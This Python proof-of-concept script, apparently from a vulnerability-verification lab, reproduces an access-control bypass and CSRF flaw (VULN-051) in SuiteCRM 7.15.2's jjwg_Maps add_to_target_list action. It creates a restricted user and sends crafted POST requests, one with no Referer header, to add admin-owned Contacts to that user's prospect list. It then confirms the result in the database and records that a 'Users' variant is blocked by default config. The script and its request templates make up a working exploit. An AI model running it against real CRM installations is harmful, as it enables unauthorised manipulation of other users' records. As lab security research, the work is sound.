#!/usr/bin/env python3
"""
VULN-051 -- jjwg_Maps `add_to_target_list`: no-ACL add-to-list (format-only
            validation), CSRF-able. Also empirically checks the doc's
            "including Users" sub-claim against this lab's actual config.

Software   : SuiteCRM
Repository : https://github.com/SuiteCRM/SuiteCRM
Affected   : 7.15.2, commit 62effd0ceb767ed3b634ade585b19a6633eb4fcb
Sink       : modules/jjwg_Maps/controller.php:320 action_add_to_target_list() --
             :328/:338 only is_guid() format checks, :360-382 add() loop with no
             ACLAccess/owner/SecurityGroup check on the list OR the added records.
CSRF       : action `add_to_target_list` is not save*/delete*, module `jjwg_Maps`
             is not in SugarApplication::$modifyModules, not in $globalModifyActions
             -> isModifyAction() false -> empty-Referer guard never fires.

IMPORTANT source-verified correction to the filed finding
-----------------------------------------------------------
The vuln doc's "including Users" claim assumes `display_module=Users` reaches the
`elseif ($object_name == 'User')` branch (controller.php:378-382). It does NOT,
under this lab's default config: `$this->display_object` is only ever populated
(controller.php:346-351) when
    in_array($_POST['display_module'], $this->settings['valid_geocode_modules'])
and jjwg_Maps.php:62-64's default `valid_geocode_modules` is
    ['Accounts','Contacts','Leads','Opportunities','Cases','Project','Meetings','Prospects']
-- 'Users' is NOT in that list, and `SELECT * FROM config WHERE category LIKE '%jjwg%'`
confirms no admin override exists in this lab. So with `display_module=Users`,
`$this->display_object` stays unset, the big guard at :353 (`!empty($this->display_object)`)
is false, and the handler replies "Target List NOT Updated" -- the Users-add code path,
while genuinely present and exploitable in principle (e.g. if an admin ever adds 'Users'
to the Maps config's module list), is INERT via this action with the shipped default.
This script demonstrates BOTH: the real, reachable bypass (Contacts, which IS in the
default list) and the Users attempt, honestly recording its actual (blocked) result.

Plan
----
1. Admin creates low-priv user L; restrict L's Contacts view/list ACL to NONE (same
   precondition rationale as VULN-050 -- otherwise "bypass" is meaningless on an open ACL).
2. Admin creates Contact C (assigned to admin) -- L cannot view it.
3. L creates own ProspectList PL.
4. POST add_to_target_list list_id=PL, display_module=Contacts, selected_ids=C
   -- WITH Referer (functionality), verify prospect_lists_prospects row + JSON "Updated".
5. POST add_to_target_list list_id=PL, display_module=Contacts, selected_ids=<2nd Contact C2>
   -- NO Referer header at all (CSRF proof).
6. POST add_to_target_list list_id=PL, display_module=Users, selected_ids=<admin's own id>
   -- record the actual (blocked) outcome for the Users sub-claim, honestly.
"""
import os
import sys

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from _common import (BASE_URL, log, banner, rand, verdict,
                      admin_session, create_user, web_login, rest_login, rest_call, BROWSER_UA)
from _c1_common import db_rows, restrict_role, ACL_ALLOW_NONE

VULN_ID = "VULN-051"
HERE = os.path.dirname(os.path.abspath(__file__))


def main():
    banner(VULN_ID, "jjwg_Maps add_to_target_list: no-ACL add-to-list + CSRF")
    log("INFO", "sink: modules/jjwg_Maps/controller.php:320-394 (is_guid-only validation, no ACL)")

    log("SETUP", "admin web + legacy REST session")
    admin_s = admin_session()
    admin_sid = rest_login("admin", os.environ.get("ADMIN_PASS", "Admin@2026!"))
    admin_id = db_rows("SELECT id FROM users WHERE user_name='admin';")[0]["id"]

    log("SETUP", "create low-priv RegularUser L, deny Contacts view/list ACL")
    low = create_user(admin_s, rand("Pw") + "!2026x")
    low_id = low["id"]
    role_id = restrict_role(low_id, [("Contacts", "view", ACL_ALLOW_NONE),
                                      ("Contacts", "list", ACL_ALLOW_NONE)])
    log("OK", f"low-priv user {low['user_name']} id={low_id}, role {role_id} denies Contacts view/list")

    log("SETUP", "admin creates two Contacts assigned to admin (L cannot view either)")
    c1_name, c2_name = rand("Mtgt1"), rand("Mtgt2")
    c1_id = rest_call("set_entry", [admin_sid, "Contacts",
                       [{"name": "last_name", "value": c1_name},
                        {"name": "assigned_user_id", "value": admin_id}]]).get("id")
    c2_id = rest_call("set_entry", [admin_sid, "Contacts",
                       [{"name": "last_name", "value": c2_name},
                        {"name": "assigned_user_id", "value": admin_id}]]).get("id")
    if not c1_id or not c2_id:
        verdict(VULN_ID, "FAILED", "could not create victim Contacts")
        sys.exit(1)
    log("OK", f"C1={c1_id} ({c1_name}), C2={c2_id} ({c2_name})")

    low_s = web_login(low["user_name"], low["password"])
    low_sid = rest_login(low["user_name"], low["password"])

    log("SETUP", "L creates own ProspectList PL")
    pl_id = rest_call("set_entry", [low_sid, "ProspectLists",
                       [{"name": rand("PL")}, {"name": "list_type", "value": "default"},
                        {"name": "assigned_user_id", "value": low_id}]]).get("id")
    if not pl_id:
        verdict(VULN_ID, "FAILED", "could not create L's ProspectList")
        sys.exit(1)
    log("OK", f"PL={pl_id} owned by L")

    # --- STEP (a): add Contact C1, with Referer --------------------------------
    log("STEP", "add_to_target_list display_module=Contacts selected_ids=C1 (with Referer)")
    r1 = low_s.post(f"{BASE_URL}/index.php",
                     params={"module": "jjwg_Maps", "action": "add_to_target_list"},
                     data={"list_id": pl_id, "display_module": "Contacts", "selected_ids": c1_id},
                     headers={"Referer": f"{BASE_URL}/index.php?module=jjwg_Maps&action=index"},
                     timeout=30)
    log("INFO", f"response(a): {r1.status_code} {r1.text.strip()[:200]!r}")

    # --- STEP (b): add Contact C2, NO Referer (CSRF proof) ----------------------
    log("STEP", "add_to_target_list display_module=Contacts selected_ids=C2 (NO Referer)")
    import requests
    r2 = requests.post(f"{BASE_URL}/index.php",
                        params={"module": "jjwg_Maps", "action": "add_to_target_list"},
                        data={"list_id": pl_id, "display_module": "Contacts", "selected_ids": c2_id},
                        headers={"User-Agent": BROWSER_UA}, cookies=low_s.cookies, timeout=30)
    log("INFO", f"response(b, no-Referer): {r2.status_code} {r2.text.strip()[:200]!r}")

    # --- STEP (c): attempt Users add -- record the ACTUAL (config-gated) outcome
    log("STEP", "add_to_target_list display_module=Users selected_ids=<admin id> "
                "(checking the 'incl. Users' sub-claim against this lab's actual config)")
    r3 = low_s.post(f"{BASE_URL}/index.php",
                     params={"module": "jjwg_Maps", "action": "add_to_target_list"},
                     data={"list_id": pl_id, "display_module": "Users", "selected_ids": admin_id},
                     headers={"Referer": f"{BASE_URL}/index.php?module=jjwg_Maps&action=index"},
                     timeout=30)
    log("INFO", f"response(c, Users): {r3.status_code} {r3.text.strip()[:200]!r}")
    users_row_before = db_rows(
        "SELECT related_id, related_type FROM prospect_lists_prospects "
        f"WHERE prospect_list_id='{pl_id}' AND related_type='Users' AND deleted=0;")
    users_add_reached = bool(users_row_before)
    log("INFO", f"Users-add actually created a row: {users_add_reached} "
                f"(expected False in this lab -- 'Users' is not in jjwg_Maps' default "
                f"valid_geocode_modules, so $this->display_object never gets set for "
                f"display_module=Users and the whole guard at controller.php:353 is false)")

    with open(os.path.join(HERE, "request.http"), "w") as f:
        f.write(
            "### (a) add Contact C1, with Referer\n"
            "POST /index.php?module=jjwg_Maps&action=add_to_target_list HTTP/1.1\n"
            f"Cookie: PHPSESSID=<L session>\nReferer: {BASE_URL}/index.php?module=jjwg_Maps&action=index\n\n"
            f"list_id={pl_id}&display_module=Contacts&selected_ids={c1_id}\n\n"
            "### (b) add Contact C2, NO Referer at all (CSRF)\n"
            "POST /index.php?module=jjwg_Maps&action=add_to_target_list HTTP/1.1\n"
            "Cookie: PHPSESSID=<L session>\n\n"
            f"list_id={pl_id}&display_module=Contacts&selected_ids={c2_id}\n\n"
            "### (c) attempt Users add (empirically blocked in this lab's default config)\n"
            "POST /index.php?module=jjwg_Maps&action=add_to_target_list HTTP/1.1\n"
            f"Cookie: PHPSESSID=<L session>\nReferer: {BASE_URL}/index.php?module=jjwg_Maps&action=index\n\n"
            f"list_id={pl_id}&display_module=Users&selected_ids={admin_id}\n"
        )
    with open(os.path.join(HERE, "response.txt"), "w") as f:
        f.write(f"(a) HTTP {r1.status_code} body[:200] (JSON prefix, then SuiteCRM's normal page "
                f"chrome follows since jjwg_MapsController sets no dedicated view):\n{r1.text[:200]}\n\n"
                f"(b) HTTP {r2.status_code} body[:200]:\n{r2.text[:200]}\n\n"
                f"(c) HTTP {r3.status_code} body[:200]:\n{r3.text[:200]}\n")

    log("STEP", "db-verify prospect_lists_prospects rows for C1 and C2 under PL")
    rows = db_rows(
        "SELECT related_id, related_type FROM prospect_lists_prospects "
        f"WHERE prospect_list_id='{pl_id}' AND related_id IN ('{c1_id}','{c2_id}') AND deleted=0;")
    log("PROOF", f"prospect_lists_prospects rows: {rows}")
    with open(os.path.join(HERE, "evidence", "db_rows.txt"), "w") as f:
        f.write(f"PL={pl_id} C1={c1_id} C2={c2_id} admin={admin_id}\nContacts rows: {rows}\n"
                f"Users rows (expected empty in this lab): {users_row_before}\n")

    got_c1 = any(r["related_id"] == c1_id for r in rows)
    got_c2 = any(r["related_id"] == c2_id for r in rows)

    ok = got_c1 and got_c2
    if not ok:
        verdict(VULN_ID, "FAILED", "Contacts add-to-list via jjwg_Maps did not create the expected rows")
        sys.exit(1)

    log("OK", f"L (denied Contacts view/list ACL) added both admin-owned Contacts to PL={pl_id} "
              f"via jjwg_Maps add_to_target_list; C2 used zero Referer (CSRF-reachable). "
              f"Users sub-claim: {'reproduced' if users_add_reached else 'NOT reachable in this lab default config (documented above/in notes.md)'}")
    verdict(VULN_ID, "CONFIRMED",
            f"format-only-validated add-to-list bypasses ACL for C1={c1_id[:8]}.. and "
            f"C2={c2_id[:8]}.. (no-Referer); Users sub-claim config-gated here (see notes.md)")
    sys.exit(0)


if __name__ == "__main__":
    main()
